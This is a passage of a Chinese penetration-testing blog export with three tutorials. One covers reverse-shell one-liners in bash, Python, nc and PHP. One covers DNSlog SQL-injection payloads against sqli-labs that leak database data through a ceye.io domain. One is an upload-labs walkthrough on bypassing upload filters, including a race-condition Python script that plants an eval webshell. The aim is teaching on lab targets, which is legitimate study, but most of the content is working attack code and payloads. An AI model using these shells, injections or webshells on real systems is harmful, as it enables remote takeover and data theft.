7777 然后在CentOS6.5下输入 1bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1 可以看到shell成功反弹到了kali上面，可以执行命令在解释这条反弹shell的命令原理之前，首先需要掌握几个点 linux文件描述符：linux shell下有三种标准的文件描述符，分别如下 0 - stdin 代表标准输入,使用&lt;或&lt;&lt; 1 - stdout 代表标准输出,使用&gt;或&gt;&gt; 2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt; 还有就是&gt;&amp;这个符号的含义，最好的理解是这样的 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符 也有师傅把&amp;这个符号解释为是取地址符号，学过C语言的小伙伴们都知道&amp;这个符号代表取地址符，在C++中&amp;符号还代表为引用，这样做是为了区分文件描述符和文件，比如查看一个不存在的文件，要把标准错误重定向到标准输出，如果直接cat notexistfile 2&gt;1的话，则会将1看作是一个文件，将标准错误输出输出到1这个文件里而不是标准输出,而&amp;的作用就是为了区分文件和文件描述符理解了上面这些知识，下面来解释一下这一条反弹shell的命令 首先，bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程在本地输入设备（键盘）输入命令，在本地看不到输入的内容，但是键盘输入的命令已经被输出到了远程，然后命令的执行结果或者错误也会被传到远程，查看远程，可以看到标准输出和标准错误输出都重定向到了远程下面在该命令后面加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向 执行bash -i &gt;&amp; /dev/tcp/ip/port后 执行bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1或者bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2后 方法2：使用python反弹，反弹shell命令如下： 1python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 首先，使用nc在kali上监听端口 1nc -lvp 7777 在CentOS下使用python去反向连接，输入 1python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 可以看到kali上成功反弹到了shell，可以执行一些命令在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理 首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3 于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了 方法3：使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下 1、下载安装 wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download tar -zxvf netcat-0.7.1.tar.gz -C /usr/local cd /usr/local mv netcat-0.7.1 netcat cd /usr/local/netcat ./configure make &amp;&amp; make install 2、配置 vim /etc/profile 添加以下内容： # set netcat path export NETCAT_HOME=/usr/local/netcat export PATH=$PATH:$NETCAT_HOME/bin 保存，退出，并使配置生效： source /etc/profile 3、测试 nc -help成功 之后在kali上使用nc监听端口 1nc -lvp 7777 在CentOS上使用nc去反向连接，命令如下： 1nc -e /bin/bash 192.168.0.4 7777 这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令注意之前使用nc监听端口反弹shell时都会有一个警告：Warning: forward host lookup failed for bogon: Unknown host,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析 1nc -nlvp 7777 如果nc不支持-e参数的话，可以利用到linux中的管道符，首先在kali上开启监听 12nc -nvlp 6666nc -nvlp 7777 之后在CentOS上使用nc去反向链接 1nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777 这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口 方法4：使用php反弹shell，方法如下首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令 1php -r 'exec(\"/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1\");' 还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程 1php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 这个姿势看起来有一些难以理解，尤其是还出现了&lt;&amp;这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法 1php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\");' 有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程 在CentOS上反向连接，输入 1php -r '$sock=fsockopen(\"192.168.0.4\",7777);exec(\"/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\");' 注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数 总结写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s the climb! 有关反弹shell的一些不错的资料Linux下反弹shell的种种方式 - r00tgrok - 博客园 Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体 Linux nc命令用法收集 - 江南小碧 - 博客园 Web渗透中的反弹Shell与端口转发的奇淫技巧 辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解","categories":[{"name":"Linux渗透","slug":"Linux渗透","permalink":"http://yoursite.com/categories/Linux渗透/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"http://yoursite.com/tags/反弹shell/"}]},{"title":"渗透技巧:使用dnslog加快盲注速度","slug":"dnslogsqli","date":"2018-06-30T11:02:43.926Z","updated":"2018-07-01T08:02:37.396Z","comments":true,"path":"2018/06/30/dnslogsqli/","link":"","permalink":"http://yoursite.com/2018/06/30/dnslogsqli/","excerpt":"渗透技巧:使用dnslog加快盲注速度sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图","text":"渗透技巧:使用dnslog加快盲注速度sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图由上图可以看出要进行dnslog注入需要几个条件： 1.web服务器操作系统必须为windows，因为UNC这个东西是windows特有的，关于UNC的解析如下 UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。格式：\\\\servername\\sharename，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\\\servername\\sharename\\directory\\filename 2.以mysql为例，数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限 其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。 配置方法，在mysql配置文件中[mysqld]里追加一条secure_file_priv = 符合了上述的两个条件就可以使用dnslog去进行注入了，首先需要有一台自己的DNS服务器，该DNS服务器的作用是用来接收DNS查询日志，从日志中获取dnslog注入的结果，这里推荐使用知道创宇的CEYE平台，注册完成后会分配给用户一个该平台的二级域名，这个二级域名可以作为我们的DNS服务器 以sqli-labs第九关为例，该关卡是一个时间盲注传统的时间盲注对网速有着一定的要求，还有就是需要一个一个字符的去判断并且会有一定的延时，效率比较低，这里使用dnslog注入来试一下 读取数据库版本信息，payload： http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\\\\\&apos;,version(),&apos;.meomna.ceye.io\\\\abc&apos;)),2,3%23 可以在CEYE平台中的DNS Query中看到数据库版本信息注意在读取当前用户时，由于root@localhost里的@符号在url里面有别的含义，@符号前面的内容会被当成login:password的格式，所以在查询时要使用hex函数进行16进制编码，否则会查询不到，payload： http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\\\\\&apos;,(select hex(user())),&apos;.meomna.ceye.io\\\\abc&apos;)),2,3%23 之后进行16进行解码便能得到内容读取当前的数据库 http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\\\\\&apos;,database(),&apos;.meomna.ceye.io\\\\abc&apos;)),2,3%23 读取当前数据库下的所有表，group_concat返回的查询结果中有,,所以要使用hex函数进行16进制编码，否则会查询不到 http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\\\\\&apos;,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),&apos;.meomna.ceye.io\\\\abc&apos;)),2,3%23 之后将得到的内容进行16进制解码就能获取到数据库内容了","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"upload-labs通关教程","slug":"upload-labs","date":"2018-06-07T08:59:26.827Z","updated":"2018-06-22T10:06:20.058Z","comments":true,"path":"2018/06/07/upload-labs/","link":"","permalink":"http://yoursite.com/2018/06/07/upload-labs/","excerpt":"upload-labs通关教程（持续更新）序最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！","text":"upload-labs通关教程（持续更新）序最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！ 靶场环境1-18关，操作系统为windows，使用的phpstudy的集成环境，apache版本为2.4.23，所以apache2.2.x的解析漏洞在该环境下不管用，php版本为5.2.17，apache配置文件没有修改过，是默认的配置文件 第一关第一关的上传过滤只是在客户端进行过滤的，js对文件后缀名做了白名单限制，任何前端的验证都不算是真正的验证，在这里我使用了4种方式去绕过，这些方法都是绕过前端验证的常用方法 1.firebug查看元素，将这里的表单的onsubmit事件删除，这样提交表单时便不会触发验证函数再次上传php就能上传 2.firebug控制台重新写一个和过滤函数名字一样的函数，使函数return true,覆盖之前的检查函数之后上传php也能上传成功 3.在火狐浏览器中禁用js，在地址栏输入about:config,查找javascript，将javascript.enabled的类型改为false，默认值为true禁用了js后就能绕过前端检测上传php了 4.先上传允许的后缀名绕过前端检测，之后burp抓包，在发往服务端的过程中将后缀名再修改为php从而绕过了前端验证 第二关第二关是在服务端做了验证，代码层对文件的MIME类型进行了检查，为了方便理解原理，可以看一下后端的检查代码 12345678if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; 有关这种场景的绕过方法，使用burp抓包，修改文件上传的content-type类型为白名单允许的图片MIME类型即可然后就可以绕过检测上传成功了 第三关&amp;第四关第三关的本意其实是想上传一些后缀名为php、php2、php3、php5、phtml等文件去绕过黑名单的,但是apache的配置文件里并没有配置将这些后缀的文件当做php解析第三关第四关都是黑名单检测，但是在这里黑名单里都没有对.htacess做限制，所以这两关都可以上传.htaccess去绕过，.htaccess文件的内容如下 &lt;FilesMatch &quot;tony&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 我们将这样一个.htaccess文件上传到服务器上传目录，这样的话，当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析，只要匹配到了文件名里有tony这个字符串，就会把该文件当成php文件解析 首先上传这样的一个.htaccess文件.htaccess可以上传成功接着上传一个黑名单里没有过滤的随意后缀名文件，但是文件名里要有tony，上传一个tony.jpg，内容为一句话木马上传成功，并且tony.jpg会被apache当成php文件解析第四关也是同样的方法 第五关第五关在第四关的黑名单中又加进了.htaccess，所以上传.htaccess这个思路没戏了 1$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); 可以看看过滤内容，过滤的还挺多，这里apache版本为2.4.23，所以apache文件名（x.php.xxx）解析漏洞不能在这用 并且在做该黑名单检查之前将上传文件后的.和空格字符都给删除了 1234567891011121314$file_name = trim($_FILES['upload_file']['name']);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; 这样做是为了防止用户上传是在后缀名后加上.和空格去绕过黑名单，windows在创建文件时会删除后缀名后的.和空格，并且后缀名为php.的文件也是可以当作php解析的（windows和linux环境都可以） 同时对文件名后缀名大小写写做了检查，防止大小写绕过 但是通过代码发现在黑名单检查之前处理文件名时只删除了一次.，于是可以上传一个后缀名为php. .的文件去绕过，这个在黑名单检查之前后缀名就会被处理为php.可以看到成功绕过了上传检测 第六关查看过滤代码 123456789101112131415$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");$file_name = $_FILES['upload_file']['name'];$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATAif (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125;&#125; else &#123; $msg = '此文件不允许上传';&#125; 相对于第五关的过滤还少了一些，相同的黑名单，但是相比于第五关，这里仅仅删除了文件名后的.，并没有删除空格，所以可以上传一个后缀名为php+空格的文件去绕过黑名单，windows在创建文件时会自动删掉最后的空格可以看到成功绕过这里的上传检测 第七关第六关仅仅将文件名后面的点删除了，第七关则是仅仅将文件名后的空格给删除了，这里通过上传后缀名为php.的文件来绕过黑名单成功绕过黑名单上传 第八关和第五关一样，虽然在黑名单检查之前将文件名后的.和空格给删除了，但是.只删除了一次，这里同样使用后缀名php. .去绕过 第九关一样的问题，所以继续用第八关的方法去绕过上传 第十关尝试上传后缀名php的文件，看到可以上传成功，不过后缀名php被删除了后缀名改为大写PHP上传，同样给删除了猜想后台使用str_ireplace函数将文件后缀为黑名单的都给删除了，查看过滤代码确实如此 1234567$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");$file_name = trim($_FILES['upload_file']['name']);$file_name = str_ireplace($deny_ext,\"\", $file_name);if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) &#123; $img_path = $UPLOAD_ADDR . '/' .$file_name; $is_upload = true;&#125; 因为str_ireplace函数只做一次替换，所以使用pphphp后缀名就能绕过可以看到成功上传php 第十一关采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀 123456789101112$ext_arr = array('jpg','png','gif');$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; 处理上传文件的方式12 $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;看起来这样防御并没有什么问题，但是这一关上传目录是可控的 所以可以先上传一个后缀名为jpg,内容为一句话木马的文件，然后修改上传目录为.php后缀，之后在.php后使用%00截断后面的拼接内容，注意这里需要关掉magic_quotes_gpc这个php扩展，否则00会被转义 1$_GET['save_path']这里使用00截断.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; 注意这里的00字符因为在url的GET参数中，所以需用进行url编码 通过这种方法就可以成功绕过十一关的上传检测 第十二关同样是上传路径可以控制，不同的是这里的路径是以POST参数传递的，同样的这里在目录后面使用00截断可以看到成功绕过上传 第十三关&amp;第十四关&amp;第十五关任务和之前的不同，这里只需要成功上传图片马，并且图片马里有完整的webshell即可 对于第十三关第十四关和第十五关这三关都是对文件幻数进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已 要想突破文件幻数检测，首先要了解jpg、png、gif这三种文件的头部格式，每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。 jpg文件头部格式文件头值为FFD8FFE000104A464946 png文件头格式，网上大部分资料写的都是89504E47，但是经过我的测试，这四个16进制是仅仅不够的，如果只是89504E47的话，会使getimagesize函数和exif_imagetype函数报错经过我的测试真正的文件头值应该是89504E470D0A1A0A gif文件头格式文件头值为474946383961 经过测试，getimagesize函数和exif_imagetype函数都只是是对文件头进行检查，只要文件头部符合函数就会返回内容 1234567891011121314151617&lt;?phpecho \"check jpg&lt;/br&gt;\";echo \"getimagesize function return:&lt;/br&gt;\";var_dump(getimagesize(\"heishacker.jpg\"));echo \"exif_imagetype function return:&lt;/br&gt;\";var_dump(exif_imagetype(\"heishacker.jpg\"));echo \"&lt;/br&gt;check png&lt;/br&gt;\";echo \"getimagesize function return:&lt;/br&gt;\";var_dump(getimagesize(\"mingren.png\"));echo \"exif_imagetype function return:&lt;/br&gt;\";var_dump(exif_imagetype(\"mingren.png\"));echo \"&lt;/br&gt;check gif&lt;/br&gt;\";echo \"getimagesize function return:&lt;/br&gt;\";var_dump(getimagesize(\"xiangtian.gif\"));echo \"exif_imagetype function return:&lt;/br&gt;\";var_dump(exif_imagetype(\"xiangtian.gif\"));?&gt; 所以这几关都可以上传图片马，图片马的文件头就是正常图片的文件头格式，从而绕过图片幻数检测 windows下图片马制作方式 copy x.jpg|png|gif/b+x.php/a x.jpg|png|gif 参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马 这三关都可以成功上传图片马，并且里面有完整的一句话木马，但是有时候图片马里面的一些字符会使php报错，导致用文件包含或者解析漏洞去解析图片马中的php时导致解析不了，可以看到利用文件包含去解析三个图片马时均不能解析所以在寻找图片制作图片马时需要耐心的寻找一些不会使php报错的图片 而且有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex分别创建shell.jpg、shell.png、shell.gif三个伪图片马之后上传这三个伪图片马，这样不光可以上传成功，也可以利用文件包含漏洞或解析漏洞解析成功这三关均可以采用这种方式通关，第十五关需要在php配置文件中开启php的php_exif扩展当然，耐心的选择一个合适的图片制作图片马也是可以的 第十六关123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=$UPLOAD_ADDR.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传失败！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传失败！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; $newimagepath = $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传失败！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; 通过第十六关的php代码可以看到对文件后缀名和MIME类型进行了检查，而且用到了php的imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为jpg、png、gif的一句话木马，这样的话上传的一句话木马会绕过后缀名和MIME类型的检查，通过move_uploaded_file上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器 分别上传后缀名为jpg、png、gif的一句话木马，可以看到虽然上传的格式不允许，但是一句话马已经上传成功了 jpgpnggif 以上只是单单针对这道题，那么如何真正的使用图片马突破二次渲染呢？可以看到如果直接使用在图片添加一句话木马的图片马上传的话，在二次渲染后一句话会被删除，导致图片马不能利用 按照一般的方法制作三种图片马上传jpg图片马上传后经过imagecreatefromjpeg函数二次渲染，图片尾部的php一句话被删除导致jpg图片马不能使用上传png图片马上传后经过imagecreatefrompng函数二次渲染，图片尾部的php一句话被删除导致png图片马不能使用上传gif图片马上传后经过imagecreatefromgif函数二次渲染，图片尾部的php一句话被删除导致gif图片马不能使用 尝试制作可以真正突破二次渲染的函数，这里可以通过十六进制编辑器查看比较上传前后图片的十六进制 ，找到二次渲染前后十六进制内容没有改变的部分，尝试将图片马写到这些没有改变的部分 自己对图片的16进制格式不是太理解，导致只制作出来了突破二次渲染的gif图片马，jpg和png都制作失败了，以后有时间再去研究将相同的部分（全00）替换为一句话木马，运气比较好，图片并没有损坏，而且绕过了二次渲染，并且没有报php语法错误但是jpg和png就不一样了，出现了很多问题，暂时还没有制作出真正图片二次渲染的jpg、png图片马 第十七关要求上传一个webshell到服务器，提示需要代码审计，查看php源代码12345678910111213141516171819202122$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = $UPLOAD_ADDR . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = $UPLOAD_ADDR . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传失败！'; &#125;&#125;通过php代码可以看到对上传的文件后缀做了白名单限制，如果上传的文件后缀如果不是jpg、png、gif的话就会被删除掉。但是这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传 123456789101112131415161718#coding=utf-8import requestsfrom multiprocessing import Pooldef CompeteUpload(list): url=\"http://192.168.242.128/upload-labs/Pass-17/index.php\" geturl=\"http://192.168.242.128/upload-labs/upload/info.php\" file=&#123;'upload_file':('info.php',\"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;\",'image/jpeg')&#125; data=&#123;'submit':'上传'&#125; r=requests.post(url=url,data=data,files=file) #print \"test upload....\" r1=requests.get(url=geturl) if r1.status_code==200: print \"upload success!\"if __name__==\"__main__\": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join() 